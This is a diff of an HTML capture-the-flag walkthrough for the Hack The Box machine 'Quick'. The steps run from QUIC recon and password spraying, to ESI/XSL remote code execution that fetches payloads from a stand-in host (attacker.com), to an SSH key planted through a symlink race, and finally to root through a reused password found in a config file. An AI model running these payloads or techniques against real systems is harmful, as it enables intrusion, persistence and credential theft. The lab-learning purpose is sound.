+<p><strong>Why:</strong><br>Port 9001 is non-standard for HTTP. This tells us the admin deliberately chose not to use port 80/8080. Why? Probably to hide something, or because port 80 is reserved for an internal service (spoiler: it is).</p>
+<p><br><em>Non-standard ports are invitations to dig deeper.</em> They suggest custom configuration, potential misconfiguration, or hidden services. Also, SSH on port 22 is "boring" until you have credentials - so prioritize the webapp.</p>
+<hr>
 <h3 id="step-1-3-the-broken-https-link">Step 1.3: The Broken HTTPS Link</h3>
 <p>Browsing <code>http://quick.htb:9001</code>, you see a link to <code>https://portal.quick.htb</code>. Clicking it fails. TCP port 443 is not open in your nmap scan.</p>
-<p><strong>Why:</strong><br />Browsers speak HTTP over TCP. If the server only speaks HTTP/3 (which uses <strong>UDP</strong>), the browser cannot connect. The box name "Quick" + a broken HTTPS link = <strong>QUIC/HTTP/3</strong>.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>When something looks broken, ask if you're speaking the wrong language.</em> The site isn't broken; your tools are. This is a critical pivot point. Most attackers give up here. You won't.</p>
-<hr />
+<p><strong>Why:</strong><br>Browsers speak HTTP over TCP. If the server only speaks HTTP/3 (which uses <strong>UDP</strong>), the browser cannot connect. The box name "Quick" + a broken HTTPS link = <strong>QUIC/HTTP/3</strong>.</p>
+<p><br><em>When something looks broken, ask if you're speaking the wrong language.</em> The site isn't broken; your tools are. This is a critical pivot point. Most attackers give up here. You won't.</p>
+<hr>
 <h3 id="step-1-4-udp-scan">Step 1.4: UDP Scan</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">sudo nmap -sU -p 443 10.129.2.152
 </code></pre>
-<p><strong>Result:</strong><br />UDP port 443 is <code>open|filtered</code>.</p>
-<p><strong>Why:</strong><br />Nmap's default is TCP. UDP scans are slower and often ignored, but HTTP/3 (QUIC) explicitly uses <strong>UDP 443</strong>. This confirms our hypothesis.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>TCP is not the only protocol.</em> Modern applications (DNS, QUIC, VPNs) live on UDP. If a box feels "empty" after a TCP scan, you're not done. The best hints are often on UDP.</p>
-<hr />
+<p><strong>Result:</strong><br>UDP port 443 is <code>open|filtered</code>.</p>
+<p><strong>Why:</strong><br>Nmap's default is TCP. UDP scans are slower and often ignored, but HTTP/3 (QUIC) explicitly uses <strong>UDP 443</strong>. This confirms our hypothesis.</p>
+<p><br><em>TCP is not the only protocol.</em> Modern applications (DNS, QUIC, VPNs) live on UDP. If a box feels "empty" after a TCP scan, you're not done. The best hints are often on UDP.</p>
+<hr>
 <h3 id="step-1-5-accessing-http-3-with-curl">Step 1.5: Accessing HTTP/3 with curl</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl --http3 -k https://portal.quick.htb/
 </code></pre>
-<p><strong>Why:</strong><br />Modern curl (8.x+) ships with <code>ngtcp2</code> and <code>nghttp3</code>, enabling native HTTP/3 support. The <code>--http3</code> flag forces curl to speak QUIC. <code>-k</code> ignores the self-signed certificate. Without this, you cannot reach the portal.</p>
-<p><strong>Result:</strong><br />The portal loads. Inside:</p>
+<p><strong>Why:</strong><br>Modern curl (8.x+) ships with <code>ngtcp2</code> and <code>nghttp3</code>, enabling native HTTP/3 support. The <code>--http3</code> flag forces curl to speak QUIC. <code>-k</code> ignores the self-signed certificate. Without this, you cannot reach the portal.</p>
+<p><strong>Result:</strong><br>The portal loads. Inside:</p>
 <ul>
 <li><code>index.php?view=about</code> → reveals email addresses (<code>jane@quick.htb</code>, <code>mike@quick.htb</code>, <code>john@quick.htb</code>)</li>
 <li><code>index.php?view=docs</code> → links to PDFs: <code>QuickStart.pdf</code> and <code>Connectivity.pdf</code></li>
 </ul>
-<p><strong>Hacker Mindset:</strong><br /><em>Use the right tool for the protocol.</em> Don't spend hours compiling <code>quiche</code> or <code>aioquic</code> if your system curl already supports HTTP/3. Check your tools first.</p>
-<hr />
+<p><br><em>Use the right tool for the protocol.</em> Don't spend hours compiling <code>quiche</code> or <code>aioquic</code> if your system curl already supports HTTP/3. Check your tools first.</p>
+<hr>
 <h3 id="step-1-6-downloading-and-analyzing-pdfs">Step 1.6: Downloading and Analyzing PDFs</h3>
 <p><strong>Commands:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl --http3 -k https://portal.quick.htb/docs/Connectivity.pdf -o /tmp/Connectivity.pdf
 pdftotext /tmp/Connectivity.pdf -
 </code></pre>
-<p><strong>Result:</strong><br />The PDF contains the default customer password: <strong>REDACTED</strong></p>
-<p><strong>Why:</strong><br />Documentation, onboarding PDFs, and "getting started" guides are goldmines. Companies often include default credentials, WiFi passwords, or internal URLs. Never skip the boring documents.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Users are lazy.</em> If the ISP gives customers a default password, at least one customer hasn't changed it. Our job is to find that customer.</p>
-<hr />
+<p><strong>Result:</strong><br>The PDF contains the default customer password: <strong><code>REDACTED</code></strong></p>
+<p><strong>Why:</strong><br>Documentation, onboarding PDFs, and "getting started" guides are useful sources. Companies often include default credentials, WiFi passwords, or internal URLs. Never skip the boring documents.</p>
+<p><br><em>Users are lazy.</em> If the ISP gives customers a default password, at least one customer hasn't changed it. Our job is to find that customer.</p>
+<hr>
 <h3 id="step-1-7-building-a-user-list">Step 1.7: Building a User List</h3>
 <p>From the main site (<code>http://quick.htb:9001</code>):</p>
 <ul>
 <li><strong>Testimonials</strong> reveal names + companies:<ul>
-<li>Tim (Qconsulting Pvt Ltd) — UK</li>
-<li>Roy (DarkWng Solutions) — US</li>
-<li>Elisa (Wink Media) — UK</li>
-<li>James (LazyCoop Pvt Ltd) — China</li>
+<li>Tim (Qconsulting Pvt Ltd) - UK</li>
+<li>Roy (DarkWng Solutions) - US</li>
+<li>Elisa (Wink Media) - UK</li>
+<li>James (LazyCoop Pvt Ltd) - China</li>
 </ul>
 </li>
 <li><strong>Clients page</strong> confirms countries.</li>
@@ -124,51 +121,51 @@ jane@quick.htb
 mike@quick.htb
 john@quick.htb
 </code></pre>
-<p><strong>Why:</strong><br />The testimonials and client list are not fluff. They provide <strong>real names</strong> and <strong>company domains</strong>. Correlating country + company + name lets us guess email formats. The UK pricing (£) suggests UK TLDs (<code>.co.uk</code>) are most likely.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>OSINT is enumeration.</em> You don't need a vulnerability to break in if you can guess a valid username. Social engineering and pattern matching are legitimate attack vectors.</p>
-<hr />
+<p><strong>Why:</strong><br>The testimonials and client list are not fluff. They provide <strong>real names</strong> and <strong>company domains</strong>. Correlating country + company + name lets us guess email formats. The UK pricing (£) suggests UK TLDs (<code>.co.uk</code>) are most likely.</p>
+<p><br><em>OSINT is enumeration.</em> You don't need a vulnerability to break in if you can guess a valid username. Social engineering and pattern matching are legitimate attack vectors.</p>
+<hr>
 <h3 id="step-1-8-password-spraying">Step 1.8: Password Spraying</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s -D - -X POST -d 'email=elisa@wink.co.uk&amp;password=REDACTED http://quick.htb:9001/login.php
+<pre><code class="language-bash" data-language="bash">curl -s -D - -X POST -d 'email=elisa@wink.co.uk&amp;password=REDACTED' http://quick.htb:9001/login.php
 </code></pre>
-<p><strong>Result:</strong><br />HTTP 302 Found with <code>Set-Cookie: null</code></p>
-<p><strong>Why:</strong><br />Instead of brute-forcing thousands of passwords against one user, we try <strong>one password against many users</strong>. This is called <strong>password spraying</strong>. It's stealthy and effective because users reuse passwords.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Work smart, not hard.</em> One correct guess is worth more than a million wrong guesses. Default passwords work more often than you'd think.</p>
-<hr />
+<p><strong>Result:</strong><br>HTTP 302 Found with <code>Set-Cookie: PHPSESSID=...</code></p>
+<p><strong>Why:</strong><br>Instead of brute-forcing thousands of passwords against one user, we try <strong>one password against many users</strong>. This is called <strong>password spraying</strong>. It's stealthy and effective because users reuse passwords.</p>
+<p><br><em>Work smart, not hard.</em> One correct guess is worth more than a million wrong guesses. Default passwords work more often than you'd think.</p>
+<hr>
 <h3 id="step-1-9-discovering-the-esi-header">Step 1.9: Discovering the ESI Header</h3>
 <p>While proxying requests through Burp, notice:</p>
 <pre><code>X-Powered-By: Esigate
 </code></pre>
-<p><strong>Why:</strong><br /><code>Esigate</code> is a web application integration gateway that supports <strong>Edge Side Includes (ESI)</strong>. ESI allows dynamic assembly of web pages from multiple sources. If user input is reflected into an ESI-enabled response, we can inject ESI tags to make the server fetch and execute arbitrary resources.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Unusual headers are cheat codes.</em> <code>X-Powered-By</code> often reveals the exact software and version. When you see something you've never heard of, Google it immediately. Every unknown technology is a potential vulnerability.</p>
-<hr />
+<p><strong>Why:</strong><br><code>Esigate</code> is a web application integration gateway that supports <strong>Edge Side Includes (ESI)</strong>. ESI allows dynamic assembly of web pages from multiple sources. If user input is reflected into an ESI-enabled response, we can inject ESI tags to make the server fetch and execute arbitrary resources.</p>
+<p><br><em>Unusual headers are cheat codes.</em> <code>X-Powered-By</code> often reveals the exact software and version. When you see something you've never heard of, Google it immediately. Every unknown technology is a potential vulnerability.</p>
+<hr>
 <h2 id="phase-2-initial-foothold-user">Phase 2: Initial Foothold (User)</h2>
 <h3 id="step-2-1-understanding-esi-injection">Step 2.1: Understanding ESI Injection</h3>
 <p>ESI tags look like XML:</p>
 <pre><code class="language-xml" data-language="xml">&lt;esi:include src="http://attacker.com/evil.xml" stylesheet="http://attacker.com/evil.xsl"/&gt;
 </code></pre>
-<p><strong>Why it works:</strong><br />When Esigate parses this tag, it fetches <code>evil.xml</code> and applies the XSL stylesheet <code>evil.xsl</code>. The XSL can contain executable code using Java extensions (<code>java.lang.Runtime</code>), giving us <strong>Remote Code Execution (RCE)</strong>.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Abuse the parser.</em> The server trusts ESI tags because they're supposed to be internal. If you can inject them into user-facing content (like a ticket description), the server becomes your puppet.</p>
-<hr />
+<p><strong>Why it works:</strong><br>When Esigate parses this tag, it fetches <code>evil.xml</code> and applies the XSL stylesheet <code>evil.xsl</code>. The XSL can contain executable code using Java extensions (<code>java.lang.Runtime</code>), giving us <strong>Remote Code Execution (RCE)</strong>.</p>
+<p><br><em>Abuse the parser.</em> The server trusts ESI tags because they're supposed to be internal. If you can inject them into user-facing content (like a ticket description), the server becomes your puppet.</p>
+<hr>
 <h3 id="step-2-2-preparing-the-payload-server">Step 2.2: Preparing the Payload Server</h3>
 <p><strong>Commands:</strong></p>
 <pre><code class="language-bash" data-language="bash">mkdir -p /tmp/quick_exploit
 cp ~/.ssh/quick_rsa.pub /tmp/quick_exploit/
 cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt;&amp;1 &amp;
 </code></pre>
-<p><strong>Why:</strong><br />The target needs to fetch our malicious XML/XSL files and our SSH public key. A simple Python HTTP server on our attack box is the fastest way to serve these.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Always prepare your infrastructure before firing the exploit.</em> You don't want to scramble to start a server while your payload is already in flight.</p>
-<hr />
+<p><strong>Why:</strong><br>The target needs to fetch our malicious XML/XSL files and our SSH public key. A simple Python HTTP server on our attack box is the fastest way to serve these.</p>
+<p><br><em>Always prepare your infrastructure before running the exploit.</em> You don't want to scramble to start a server while your payload is already in flight.</p>
+<hr>
 <h3 id="step-2-3-generating-an-ssh-keypair">Step 2.3: Generating an SSH Keypair</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">ssh-keygen -t rsa -f ~/.ssh/quick_rsa -N ""
 </code></pre>
-<p><strong>Why:</strong><br />Instead of fighting with reverse shells (which often die, have no TTY, or fail behind firewalls), we <strong>write our own access</strong>. Dropping an SSH public key into a user's <code>authorized_keys</code> gives us a stable, interactive shell.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Prefer persistent access over one-shot shells.</em> A reverse shell is a conversation; an SSH key is a key to the house. Always choose the latter when possible.</p>
-<hr />
+<p><strong>Why:</strong><br>Instead of fighting with reverse shells (which often die, have no TTY, or fail behind firewalls), we <strong>write our own access</strong>. Dropping an SSH public key into a user's <code>authorized_keys</code> gives us a stable, interactive shell.</p>
+<p><br><em>Prefer persistent access over one-shot shells.</em> A reverse shell is a conversation; an SSH key is a key to the house. Always choose the latter when possible.</p>
+<hr>
 <h3 id="step-2-4-crafting-the-xsl-payloads">Step 2.4: Crafting the XSL Payloads</h3>
 <p>We need <strong>two separate tickets</strong> because <code>Runtime.exec()</code> chokes on complex shell syntax like <code>&amp;&amp;</code> and pipes. Simple commands work.</p>
-<p><strong>Ticket 1 — Create the <code>.ssh</code> directory:</strong></p>
+<p><strong>Ticket 1 - Create the <code>.ssh</code> directory:</strong></p>
 <pre><code class="language-xml" data-language="xml">&lt;?xml version="1.0" ?&gt;
 &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
 &lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
@@ -184,7 +181,7 @@ cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt
 &lt;/xsl:template&gt;
 &lt;/xsl:stylesheet&gt;
 </code></pre>
-<p><strong>Ticket 2 — Download the SSH key:</strong></p>
+<p><strong>Ticket 2 - Download the SSH key:</strong></p>
 <pre><code class="language-xml" data-language="xml">&lt;?xml version="1.0" ?&gt;
 &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
 &lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
@@ -200,10 +197,10 @@ cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt
 &lt;/xsl:template&gt;
 &lt;/xsl:stylesheet&gt;
 </code></pre>
-<p><strong>Why:</strong><br />The <code>xmlns:rt</code> namespace imports <code>java.lang.Runtime</code>. <code>rt:getRuntime()</code> gets the runtime object, and <code>rt:exec()</code> executes a system command. The CDATA section protects special XML characters.</p>
-<p><strong>Critical Lesson:</strong><br />We initially tried <code>bash -c "mkdir -p /home/sam/.ssh &amp;&amp; wget ..."</code> but <code>Runtime.exec()</code> tokenizes arguments differently than a shell. Pipes, redirects, and <code>&amp;&amp;</code> break. <strong>Simple commands only.</strong></p>
-<p><strong>Hacker Mindset:</strong><br /><em>Know your execution context.</em> A command that works in <code>bash</code> may fail in <code>Runtime.exec()</code>, <code>system()</code>, or <code>execve()</code>. Test simple primitives first.</p>
-<hr />
+<p><strong>Why:</strong><br>The <code>xmlns:rt</code> namespace imports <code>java.lang.Runtime</code>. <code>rt:getRuntime()</code> gets the runtime object, and <code>rt:exec()</code> executes a system command. The CDATA section protects special XML characters.</p>
+<p><strong>Critical Lesson:</strong><br>We initially tried <code>bash -c "mkdir -p /home/sam/.ssh &amp;&amp; wget ..."</code> but <code>Runtime.exec()</code> tokenizes arguments differently than a shell. Pipes, redirects, and <code>&amp;&amp;</code> break. <strong>Simple commands only.</strong></p>
+<p><br><em>Know your execution context.</em> A command that works in <code>bash</code> may fail in <code>Runtime.exec()</code>, <code>system()</code>, or <code>execve()</code>. Test simple primitives first.</p>
+<hr>
 <h3 id="step-2-5-submitting-malicious-tickets">Step 2.5: Submitting Malicious Tickets</h3>
 <p><strong>Ticket 1:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' -X POST \
@@ -221,18 +218,18 @@ cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt
 <p><strong>Trigger Ticket 2:</strong></p>
 <pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' 'http://quick.htb:9001/search.php?search=7333'
 </code></pre>
-<p><strong>Why:</strong><br />The ticket submission stores the ESI payload in the database. The <strong>search</strong> function retrieves the ticket and reflects it into the page. Esigate parses the ESI tag, fetches our XSL, and executes the command.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Find the reflection point.</em> Stored XSS/ESI is useless until it's rendered. The search page is the trigger.</p>
-<hr />
+<p><strong>Why:</strong><br>The ticket submission stores the ESI payload in the database. The <strong>search</strong> function retrieves the ticket and reflects it into the page. Esigate parses the ESI tag, fetches our XSL, and executes the command.</p>
+<p><br><em>Find the reflection point.</em> Stored XSS/ESI is useless until it's rendered. The search page is the trigger.</p>
+<hr>
 <h3 id="step-2-6-ssh-as-sam">Step 2.6: SSH as Sam</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">ssh -i ~/.ssh/quick_rsa sam@quick.htb
 </code></pre>
-<p><strong>Result:</strong><br />Shell as <code>sam</code>. Grab the user flag:</p>
+<p><strong>Result:</strong><br>Shell as <code>sam</code>. Grab the user flag:</p>
 <pre><code class="language-bash" data-language="bash">cat ~/user.txt
 </code></pre>
-<p><strong>Why:</strong><br />Stable shell, full TTY, no netcat juggling. This is the reward for choosing the SSH key route.</p>
-<hr />
+<p><strong>Why:</strong><br>Stable shell, full TTY, no netcat juggling. This is the reward for choosing the SSH key route.</p>
+<hr>
 <h2 id="phase-3-privilege-escalation-to-srvadm">Phase 3: Privilege Escalation to srvadm</h2>
 <h3 id="step-3-1-mysql-enumeration">Step 3.1: MySQL Enumeration</h3>
 <p><strong>Command:</strong></p>
@@ -241,20 +238,20 @@ cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt
 <p><strong>Result:</strong></p>
 <pre><code class="language-php" data-language="php">$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
 </code></pre>
-<p><strong>Why:</strong><br />Database credentials are often hardcoded in PHP includes. <code>db.php</code> is a classic target. Once you have DB access, you own the application's authentication layer.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Config files are confessionals.</em> Developers store secrets in plain text because it's convenient. Always grep for <code>password</code>, <code>secret</code>, and <code>key</code> in web roots.</p>
-<hr />
+<p><strong>Why:</strong><br>Database credentials are often hardcoded in PHP includes. <code>db.php</code> is a classic target. Once you have DB access, you own the application's authentication layer.</p>
+<p><br><em>Config files are high-value targets.</em> Developers store secrets in plain text because it's convenient. Always grep for <code>password</code>, <code>secret</code>, and <code>key</code> in web roots.</p>
+<hr>
 <h3 id="step-3-2-extracting-srvadm-s-hash">Step 3.2: Extracting srvadm's Hash</h3>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">mysql -u db_adm -p REDACTED -e "select email,password from users where email='srvadm@quick.htb';"
+<pre><code class="language-bash" data-language="bash">mysql -u db_adm -p quick -e "select email,password from users where email='srvadm@quick.htb';"
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>| srvadm@quick.htb | [redacted retired-lab hash or flag] |
+<pre><code>| srvadm@quick.htb | REDACTED_HASH_OR_FLAG |
 </code></pre>
-<p><strong>Why:</strong><br />The <code>users</code> table contains password hashes. For <code>srvadm</code>, the hash is <code>[redacted retired-lab hash or flag]</code>. The login logic uses <code>md5(crypt($password,'fa'))</code>.</p>
-<p><strong>Important Distinction:</strong><br />This is the <strong>web application password</strong>, not the Linux system password. <code>su srvadm</code> uses <code>/etc/shadow</code>, which is different. We cannot <code>su</code> with this password. But we <em>can</em> use it to login to the printer management interface.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Distinguish application credentials from OS credentials.</em> Just because a password unlocks a web app doesn't mean it unlocks the shell. Map each credential to its scope.</p>
-<hr />
+<p><strong>Why:</strong><br>The <code>users</code> table contains password hashes. For <code>srvadm</code>, the hash is <code>REDACTED_HASH_OR_FLAG</code>. The login logic uses <code>md5(crypt($password,'fa'))</code>.</p>
+<p><strong>Important Distinction:</strong><br>This is the <strong>web application password</strong>, not the Linux system password. <code>su srvadm</code> uses <code>/etc/shadow</code>, which is different. We cannot <code>su</code> with this password. But we <em>can</em> use it to login to the printer management interface.</p>
+<p><br><em>Distinguish application credentials from OS credentials.</em> Just because a password unlocks a web app doesn't mean it unlocks the shell. Map each credential to its scope.</p>
+<hr>
 <h3 id="step-3-3-accessing-the-internal-printer-interface">Step 3.3: Accessing the Internal Printer Interface</h3>
 <p>From Apache config (<code>/etc/apache2/sites-enabled/000-default.conf</code>):</p>
 <pre><code class="language-apache" data-language="apache">&lt;VirtualHost *:80&gt;
@@ -263,9 +260,9 @@ cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt
     DocumentRoot /var/www/printer
 &lt;/VirtualHost&gt;
 </code></pre>
-<p><strong>Why:</strong><br />Port 80 is only bound to <code>127.0.0.1</code>. From our shell as <code>sam</code>, we can access it via <code>curl -H 'Host: printerv2.quick.htb' http://127.0.0.1:80/</code>. The <code>AssignUserId srvadm srvadm</code> directive means this vhost runs as <code>srvadm</code> — critical for privilege escalation.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Internal services are soft targets.</em> Just because a port isn't exposed externally doesn't mean it's secure. Once you're inside, localhost becomes a goldmine.</p>
-<hr />
+<p><strong>Why:</strong><br>Port 80 is only bound to <code>127.0.0.1</code>. From our shell as <code>sam</code>, we can access it via <code>curl -H 'Host: printerv2.quick.htb' http://127.0.0.1:80/</code>. The <code>AssignUserId srvadm srvadm</code> directive means this vhost runs as <code>srvadm</code> - critical for privilege escalation.</p>
+<p><br><em>Internal services are soft targets.</em> Just because a port isn't exposed externally doesn't mean it's secure. Once you're inside, localhost becomes a useful source.</p>
+<hr>
 <h3 id="step-3-4-understanding-the-printer-exploit">Step 3.4: Understanding the Printer Exploit</h3>
 <p>The printer interface (<code>/var/www/printer/job.php</code>) does the following:</p>
 <pre><code class="language-php" data-language="php">$file = date("Y-m-d_H:i:s");
@@ -277,17 +274,17 @@ $printer -&gt; text(file_get_contents("/var/www/jobs/".$file));
 ...
 unlink("/var/www/jobs/".$file);
 </code></pre>
-<p><strong>The Bug:</strong><br /><code>file_put_contents</code> writes to <code>/var/www/jobs/</code>, but <code>chmod</code> tries <code>/var/www/printer/jobs/</code> (which doesn't exist). The file is created with default permissions.</p>
-<p><strong>The Exploit:</strong><br /><code>/var/www/jobs</code> is <strong>world-writable</strong> (<code>drwxrwxrwx</code>). If we create a <strong>symlink</strong> in <code>/var/www/jobs/</code> with the same name as the timestamp <code>job.php</code> will use, <code>file_put_contents</code> will <strong>follow the symlink</strong> and write our data to wherever it points.</p>
+<p><strong>The Bug:</strong><br><code>file_put_contents</code> writes to <code>/var/www/jobs/</code>, but <code>chmod</code> tries <code>/var/www/printer/jobs/</code> (which doesn't exist). The file is created with default permissions.</p>
+<p><strong>The Exploit:</strong><br><code>/var/www/jobs</code> is <strong>world-writable</strong> (<code>drwxrwxrwx</code>). If we create a <strong>symlink</strong> in <code>/var/www/jobs/</code> with the same name as the timestamp <code>job.php</code> will use, <code>file_put_contents</code> will <strong>follow the symlink</strong> and write our data to wherever it points.</p>
 <p>We point the symlink to <code>/home/srvadm/.ssh/authorized_keys</code>. When the admin submits a print job containing our SSH public key, our key gets written to srvadm's authorized keys.</p>
-<p><strong>Why this works:</strong><br /><code>file_put_contents()</code> follows symlinks. The write happens <strong>before</strong> the network connection to the printer. Even if the printer is offline, the write succeeds.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Race conditions favor the prepared.</em> Instead of trying to swap the file after creation (which is a narrow window), we <strong>pre-place</strong> symlinks for every second in the next minute. When the job fires, one of our symlinks matches the timestamp. We turn a race into a near-certainty.</p>
-<hr />
+<p><strong>Mechanism:</strong><br><code>file_put_contents()</code> follows symlinks. The write happens <strong>before</strong> the network connection to the printer. Even if the printer is offline, the write succeeds.</p>
+<p><br><em>Race conditions favor the prepared.</em> Instead of trying to swap the file after creation (which is a narrow window), we <strong>pre-place</strong> symlinks for every second in the next minute. When the job fires, one of our symlinks matches the timestamp. We turn a race into a near-certainty.</p>
+<hr>
 <h3 id="step-3-5-executing-the-symlink-flood-print-job">Step 3.5: Executing the Symlink Flood + Print Job</h3>
 <p><strong>On the target (as <code>sam</code>):</strong></p>
 <pre><code class="language-bash" data-language="bash"># Login to printer interface
 curl -s -c /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
-  -X POST -d 'email=srvadm@quick.htb&amp;password=REDACTED \
+  -X POST -d 'email=srvadm@quick.htb&amp;password=REDACTED' \
   http://127.0.0.1:80/index.php
 
 # Add a fake printer pointing back to our Kali box
@@ -311,17 +308,17 @@ curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
   --data-urlencode "submit=Print" \
   http://127.0.0.1:80/job.php
 </code></pre>
-<p><strong>Result:</strong><br />The job returns "Can't connect to printer" (because our Kali box isn't listening on 9100), but <code>file_put_contents</code> has already executed. The key is now in <code>/home/srvadm/.ssh/authorized_keys</code>.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>You don't need the printer to work; you only need the file write.</em> Error messages are noise. Focus on the side effects.</p>
-<hr />
+<p><strong>Result:</strong><br>The job returns "Can't connect to printer" (because our Kali box isn't listening on 9100), but <code>file_put_contents</code> has already executed. The key is now in <code>/home/srvadm/.ssh/authorized_keys</code>.</p>
+<p><br><em>You don't need the printer to work; you only need the file write.</em> Error messages are noise. Focus on the side effects.</p>
+<hr>
 <h3 id="step-3-6-ssh-as-srvadm">Step 3.6: SSH as srvadm</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">ssh -i ~/.ssh/quick_rsa srvadm@quick.htb
 </code></pre>
-<p><strong>Result:</strong><br />Shell as <code>srvadm</code>.</p>
-<p><strong>Why:</strong><br />The symlink trick gave us write access to srvadm's <code>authorized_keys</code> because the printer job ran as <code>srvadm</code> (per the Apache <code>AssignUserId</code> directive).</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Abuse process identity.</em> When a service runs as a specific user, any file operation it performs inherits that user's privileges. If you can control the filename (via symlink), you control where the data lands.</p>
-<hr />
+<p><strong>Result:</strong><br>Shell as <code>srvadm</code>.</p>
+<p><strong>Why:</strong><br>The symlink trick gave us write access to srvadm's <code>authorized_keys</code> because the printer job ran as <code>srvadm</code> (per the Apache <code>AssignUserId</code> directive).</p>
+<p><br><em>Abuse process identity.</em> When a service runs as a specific user, any file operation it performs inherits that user's privileges. If you can control the filename (via symlink), you control where the data lands.</p>
+<hr>
 <h2 id="phase-4-root">Phase 4: Root</h2>
 <h3 id="step-4-1-finding-the-root-password">Step 4.1: Finding the Root Password</h3>
 <p><strong>Command:</strong></p>
@@ -339,20 +336,20 @@ curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
 <p><strong>Decoded URL:</strong></p>
 <pre><code>https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
 </code></pre>
-<p><strong>Why:</strong><br />In URL syntax, <code>https://username:REDACTED@host/path</code> embeds credentials. The printer configuration file contains the plaintext password for <code>printerv3.quick.htb</code>. The username is <code>srvadm@quick.htb</code> and the password is REDACTED.</p>
-<p><strong>Hacker Mindset:</strong><br /><em>Config files are the gift that keeps on giving.</em> Even after you've compromised a user, always grep their home directory for <code>.conf</code>, <code>.ini</code>, <code>.xml</code>, and cache files. Admins often reuse passwords across services.</p>
-<hr />
+<p><strong>Why:</strong><br>In URL syntax, <code>https://username:REDACTED@host/path</code> embeds credentials. The printer configuration file contains the plaintext password for <code>printerv3.quick.htb</code>. The username is <code>srvadm@quick.htb</code> and the password is <code>REDACTED</code>.</p>
+<p><br><em>Config files are a recurring source of useful data.</em> Even after you've compromised a user, always grep their home directory for <code>.conf</code>, <code>.ini</code>, <code>.xml</code>, and cache files. Admins often reuse passwords across services.</p>
+<hr>
 <h3 id="step-4-2-becoming-root">Step 4.2: Becoming Root</h3>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">su - root
 </code></pre>
-<p><strong>Password:</strong> REDACTED</p>
-<p><strong>Result:</strong><br />Root shell.</p>
+<p><strong>Password:</strong> <code>REDACTED</code></p>
+<p><strong>Result:</strong><br>Root shell.</p>
 <p><strong>Command:</strong></p>
 <pre><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
-<p><strong>Hacker Mindset:</strong><br /><em>Password reuse is the ultimate shortcut.</em> The root password was sitting in a printer config file, URL-encoded but otherwise naked. Once you find one password, always try it everywhere — especially <code>su</code>, <code>sudo</code>, and other services.</p>
-<hr />
+<p><br><em>Password reuse is the ultimate shortcut.</em> The root password was sitting in a printer config file, URL-encoded but otherwise naked. Once you find one password, always try it everywhere - especially <code>su</code>, <code>sudo</code>, and other services.</p>
+<hr>
 <h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
 <table aria-label="Key Lessons &amp; Takeaways data table">
 <thead>
@@ -398,17 +395,16 @@ curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
 <td>Internal vhosts and services on 127.0.0.1 are often less hardened than external ones.</td>
 </tr>
 </tbody></table>
-<hr />
+<hr>
 <p><strong>Flags:</strong></p>
 <ul>
 <li><strong>User:</strong> <code>655e0[redacted]c61d65a2</code></li>
 <li><strong>Root:</strong> <code>7a5b9[redacted]fc241ab5fc</code></li>
-</ul>
-24:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$28"}}]
+</ul>24:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$28"}}]
